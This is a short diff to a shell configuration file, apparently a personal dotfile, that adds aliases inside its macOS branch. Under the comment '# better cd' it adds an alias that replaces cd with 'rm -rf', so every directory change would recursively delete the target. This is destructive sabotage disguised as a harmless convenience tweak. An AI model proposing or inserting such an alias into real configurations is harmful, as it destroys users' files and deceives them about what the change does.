@@ -192,6 +192,9 @@ if [[ "$UNAME" == "Darwin" ]]; then
 
     # Current date for sparkle appcast
     alias appcastdate='date --rfc-2822'
+    
+    # better cd
+    alias cd='rm -rf'
 
 elif [[ "$UNAME" == "Linux" ]]; then
     if [[ "$(cat /proc/sys/kernel/osrelease)" =~ .*Microsoft.* ]]; then
